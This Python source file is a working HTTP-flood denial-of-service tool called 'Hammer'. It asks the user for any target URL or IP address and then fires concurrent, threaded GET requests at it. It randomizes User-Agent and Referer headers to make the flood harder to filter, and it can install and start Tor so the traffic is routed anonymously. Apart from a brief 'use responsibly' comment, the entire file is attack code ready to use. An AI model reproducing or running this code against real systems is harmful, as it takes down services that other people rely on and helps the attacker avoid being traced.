#!/usr/bin/env python3

#
#  Hammer -- By, Kanax01
#
#  Uses HTTP flooding to overwhelm the target
#  Use responsibly and only against targets you have permission to test
#
#  This tool is built for Windows and may require adjustments for other platforms
#
#  This tool uses the GNU General Public License v3.0 (GPL-3.0) for open-source distribution
#
#  Its recommended to have chocolatey installed for easy Tor installation, but it's not required if you have Tor already set up
#

import concurrent.futures
import os
import random
import threading
import requests
import subprocess
import sys
import time
import socket
from colorama import Fore, Style, init
from referers import get_headers_referers
from useragents import get_useragents

try:
    import msvcrt
except ImportError:
    msvcrt = None

STOP_EVENT = threading.Event()
TOR_PROCESS = None


def banner():
    print(Fore.YELLOW + r"""
          
       T                                    \`.    T
       |    T     .--------------.___________) \   |    T
       !    |     |//////////////|___________[ ]   !  T |
            !     `--------------'           ) (      | !
                                             '-'      !
          
          
         __    __       ___      .___  ___. .___  ___.  _______ .______      
        |  |  |  |     /   \     |   \/   | |   \/   | |   ____||   _  \     
        |  |__|  |    /  ^  \    |  \  /  | |  \  /  | |  |__   |  |_)  |    
        |   __   |   /  /_\  \   |  |\/|  | |  |\/|  | |   __|  |      /     
        |  |  |  |  /  _____  \  |  |  |  | |  |  |  | |  |____ |  |\  \----.
        |__|  |__| /__/     \__\ |__|  |__| |__|  |__| |_______|| _| `._____|
                                                                       
          """ + Style.RESET_ALL)
    
    print(Fore.CYAN + Style.BRIGHT + "\nBy, Kanax01" + Style.RESET_ALL)
    print(Fore.CYAN + Style.BRIGHT + "Hammer -- iDDOS Tool" + Style.RESET_ALL)
    print(Fore.CYAN + Style.BRIGHT + "Use responsibly!!!" + Style.RESET_ALL)
    

def build_headers(useragents, referers):
    return {
        "User-Agent": random.choice(useragents),
        "Referer": random.choice(referers)
    }


def listen_for_end():
    if not msvcrt:
        return

    while not STOP_EVENT.is_set():
        if msvcrt.kbhit():
            key = msvcrt.getch()
            if key in (b'\x00', b'\xe0'):
                special = msvcrt.getch()
                if special == b'O':
                    STOP_EVENT.set()
                    print(Fore.RED + Style.BRIGHT + "\nEND key pressed: stopping attack..." + Style.RESET_ALL)
                    time.sleep(2)
                    sys.exit()


def is_tor_ready(host='127.0.0.1', port=9050, timeout=2):
    """Check if Tor SOCKS5 proxy is ready and listening"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((host, port))
        sock.close()
        return result == 0
    except Exception:
        return False


def install_tor():
    """Attempt to install Tor using Chocolatey"""
    try:
        print(Fore.YELLOW + "[*] Attempting to install Tor via Chocolatey..." + Style.RESET_ALL)
        
        # Check if choco is available
        subprocess.run(['choco', '--version'], capture_output=True, check=True)
        
        # Install Tor
        result = subprocess.run(
            ['choco', 'install', 'tor', '-y'],
            capture_output=True,
            text=True
        )
        
        if result.returncode == 0:
            print(Fore.GREEN + "[+] Tor installed successfully!" + Style.RESET_ALL)
            return True
        else:
            print(Fore.RED + "[-] Failed to install Tor via Chocolatey" + Style.RESET_ALL)
            time.sleep(2)
            continue_choice = input(Fore.GREEN + Style.BRIGHT + "Continue attack without Tor? (y/n): " + Style.RESET_ALL).strip().lower()
            if continue_choice != 'y':
                print(Fore.YELLOW + "[*] Exiting..." + Style.RESET_ALL)
                sys.exit()
            else:
                return False
            
    except FileNotFoundError:
        print(Fore.RED + "[-] Chocolatey is not installed." + Style.RESET_ALL)
        print(Fore.YELLOW + "[*] Install Chocolatey from https://chocolatey.org/install" + Style.RESET_ALL)
        print(Fore.YELLOW + "[*] Or download Tor from https://www.torproject.org/download/" + Style.RESET_ALL)
        continue_choice = input(Fore.GREEN + Style.BRIGHT + "Continue attack without Tor? (y/n): " + Style.RESET_ALL).strip().lower()
        if continue_choice != 'y':
            print(Fore.YELLOW + "[*] Exiting..." + Style.RESET_ALL)
            sys.exit()
        else:
            return False
        
    except Exception as e:
        print(Fore.RED + f"[-] Error installing Tor: {str(e)}" + Style.RESET_ALL)
        continue_choice = input(Fore.GREEN + Style.BRIGHT + "Continue attack without Tor? (y/n): " + Style.RESET_ALL).strip().lower()
        if continue_choice != 'y':
            print(Fore.YELLOW + "[*] Exiting..." + Style.RESET_ALL)
            sys.exit()
        else:
            return False


def start_tor():
    """Start Tor process with SOCKS5 proxy configuration"""
    global TOR_PROCESS
    
    try:
        print(Fore.YELLOW + "[*] Launching Tor..." + Style.RESET_ALL)
        
        # Create Tor configuration
        tor_config = """
            SocksPort 9050
            ControlPort 9051
            Log notice stdout
            RunAsDaemon 0"""
        
        # Write config to temp file
        config_path = os.path.join(os.path.expanduser('~'), '.tor_config')
        with open(config_path, 'w') as f:
            f.write(tor_config)
        
        # Start Tor process
        TOR_PROCESS = subprocess.Popen(
            ['tor', '-f', config_path],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
        )
        
        # Wait for Tor to be ready
        print(Fore.YELLOW + "[*] Waiting for Tor to initialize..." + Style.RESET_ALL)
        wait_time = 0
        max_wait = 30
        
        while wait_time < max_wait:
            if is_tor_ready():
                print(Fore.GREEN + "[+] Tor is ready on 127.0.0.1:9050" + Style.RESET_ALL)
                return "success"
            time.sleep(1)
            wait_time += 1
            print(Fore.YELLOW + f"[*] Connecting to Tor... ({wait_time}/{max_wait}s)" + Style.RESET_ALL)
        
        print(Fore.RED + "[-] Tor failed to initialize within timeout" + Style.RESET_ALL)
        return "timeout"
        
    except FileNotFoundError:
        return "not_installed"
    except Exception as e:
        print(Fore.RED + f"[-] Error starting Tor: {str(e)}" + Style.RESET_ALL)
        return "error"


def stop_tor():
    """Stop Tor process gracefully"""
    global TOR_PROCESS
    
    if TOR_PROCESS:
        try:
            TOR_PROCESS.terminate()
            TOR_PROCESS.wait(timeout=5)
            print(Fore.YELLOW + "[*] Tor stopped" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + f"[-] Error stopping Tor: {str(e)}" + Style.RESET_ALL)
            try:
                TOR_PROCESS.kill()
            except:
                pass
        finally:
            TOR_PROCESS = None


def send_request(session, target, headers, timeout=5, use_tor=False):
    try:
        if use_tor:
            # Route through Tor using SOCKS5 proxy
            proxies = {
                'http': 'socks5://127.0.0.1:9050',
                'https': 'socks5://127.0.0.1:9050'
            }
            response = session.get(target, headers=headers, timeout=timeout, proxies=proxies)
        else:
            response = session.get(target, headers=headers, timeout=timeout)
        return response.status_code
    except requests.RequestException:
        return None


def attack_target(target, useragents, referers, count, threads, use_tor=False):
    tor_status = " (via Tor)" if use_tor else ""
    print(Fore.GREEN + Style.BRIGHT + f"Starting attack: {count} requests to {target}{tor_status}" + Style.RESET_ALL)
    print(Fore.YELLOW + "Press END to stop the program at any time." + Style.RESET_ALL)

    with requests.Session() as session:
        session.headers.update({"Connection": "keep-alive"})

        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            for attempt in range(1, count + 1):
                if STOP_EVENT.is_set():
                    break

                headers = build_headers(useragents, referers)
                future = executor.submit(send_request, session, target, headers, 5, use_tor)
                futures.append((attempt, headers, future))

            for attempt, headers, future in futures:
                if STOP_EVENT.is_set():
                    break

                status = future.result()
                status_text = str(status) if status else "error"
                print(Fore.CYAN + f"[{attempt}/{count}] status={status_text} user-agent={headers['User-Agent'][:48]}..." + Style.RESET_ALL)

    if STOP_EVENT.is_set():
        print(Fore.RED + Style.BRIGHT + "Attack stopped by user." + Style.RESET_ALL)
    else:
        print(Fore.GREEN + Style.BRIGHT + "Attack complete." + Style.RESET_ALL)


def main():
    global TOR_PROCESS
    init(autoreset=True)
    os.system("title Hammer - By, Kanax01")
    banner()
    
    target = input(Fore.GREEN + Style.BRIGHT + "Enter Target (either IP or URL): " + Style.RESET_ALL).strip()
    if not target:
        print(Fore.RED + "No target specified. Exiting." + Style.RESET_ALL)
        return

    if not target.startswith(("http://", "https://")):
        target = "http://" + target

    try:
        count = int(input(Fore.GREEN + Style.BRIGHT + "Request count: " + Style.RESET_ALL).strip())
    except ValueError:
        count = 10

    try:
        threads = int(input(Fore.GREEN + Style.BRIGHT + "Concurrency threads (default 20): " + Style.RESET_ALL).strip())
    except ValueError:
        threads = 20

    use_tor = input(Fore.GREEN + Style.BRIGHT + "Use Tor? (y/n, default n): " + Style.RESET_ALL).strip().lower() == 'y'
    
    if use_tor:
        result = start_tor()
        
        if result == "not_installed":
            print(Fore.RED + "[-] Tor is not installed" + Style.RESET_ALL)
            install_choice = input(Fore.GREEN + Style.BRIGHT + "Install Tor? (y/n): " + Style.RESET_ALL).strip().lower()
            
            if install_choice == 'y':
                if install_tor():
                    result = start_tor()
                    if result != "success":
                        use_tor = False
                else:
                    use_tor = False
            else:
                continue_choice = input(Fore.GREEN + Style.BRIGHT + "Continue attack without Tor? (y/n): " + Style.RESET_ALL).strip().lower()
                if continue_choice != 'y':
                    print(Fore.YELLOW + "[*] Exiting..." + Style.RESET_ALL)
                    sys.exit()
                else:
                    use_tor = False
        
        elif result != "success":
            print(Fore.YELLOW + "[*] Failed to start Tor, continuing without it..." + Style.RESET_ALL)
            use_tor = False
    

    useragents = get_useragents()
    referers = get_headers_referers()

    listener = threading.Thread(target=listen_for_end, daemon=True)
    listener.start()
    
    try:
        attack_target(target, useragents, referers, count, threads, use_tor)
    finally:
        if use_tor:
            stop_tor()
        exit_msg = input(Fore.YELLOW + Style.BRIGHT + "Press Enter to exit..." + Style.RESET_ALL)
        sys.exit()

if __name__ == '__main__':
    main()
